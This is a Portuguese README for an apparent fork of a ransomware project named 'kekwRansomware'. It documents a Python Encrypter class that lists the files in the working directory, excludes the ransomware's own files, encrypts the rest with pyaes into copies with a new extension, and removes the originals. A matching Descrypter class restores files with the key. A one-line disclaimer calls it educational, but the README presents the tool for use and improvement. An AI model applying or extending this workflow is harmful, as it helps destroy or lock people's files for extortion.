
#README

<h1>Projeto Melhorado - Fork do Kekeransowere</h1>
Este repositório é um fork do projeto original localizado na pasta "kekwransowere". O objetivo deste fork é aprimorar o código existente, implementar melhorias e contribuir para o desenvolvimento contínuo do projeto.

<h2> Como Usar </h2>

<h3>Chave de Criptografia:</h3>

#A classe Encrypter é inicializada com uma chave de criptografia fornecida como argumento.

encrypter = Encrypter(key)
Listar Arquivos:

#listFiles retorna uma lista dos arquivos no diretório atual.

files = encrypter.listFiles

#Lista Oficial:

officialList retorna uma lista filtrada excluindo arquivos específicos associados ao ransomware.

officialFiles = encrypter.officialList

#Remover Arquivos:

removeFiles(file) remove um arquivo específico.

encrypter.removeFiles(file)

#Criptografar Dados:

encrypterData(file) utiliza a biblioteca pyaes para criptografar os dados de um arquivo.

encryptedData = encrypter.encrypterData(fileData)

#Criar Arquivo Criptografado:

fileCreater(file, data) cria um novo arquivo com a extensão "kekwRansomware" contendo os dados criptografados.

encrypter.fileCreater(file, encryptedData)

#Criptografar Arquivos:

encrypterFiles() percorre a lista oficial, criptografa os arquivos e cria versões criptografadas.

encrypter.encrypterFiles()

<h1>Aviso</h1>

Este é um projeto educacional e não deve ser usado de maneira maliciosa.
A chave de criptografia é fornecida na inicialização da classe e é crucial para descriptografar os arquivos.

<h2>Chave de Descriptação:</h2>

#Inicialize a classe Descrypter com a mesma chave de descriptação usada durante a encriptação.

descrypter = Descrypter(chave)

#Descriptar Dados:

descrypterData(arquivo) utiliza a biblioteca pyaes para descriptar dados de um arquivo encriptado.

dadosDescriptados = descrypter.descrypterData(dadosDoArquivo)

#Criar Arquivo Descriptado:

descrypterFileCreator(nomeDoArquivo, dados) cria um novo arquivo sem a extensão "kekwRansomware" contendo dados descriptados.

descrypter.descrypterFileCreator(nomeDoArquivo, dadosDescriptados)

#Descriptar Arquivos:

descrypterFiles() percorre a lista oficial, descripta os arquivos e cria versões descriptadas.

descrypter.descrypterFiles()
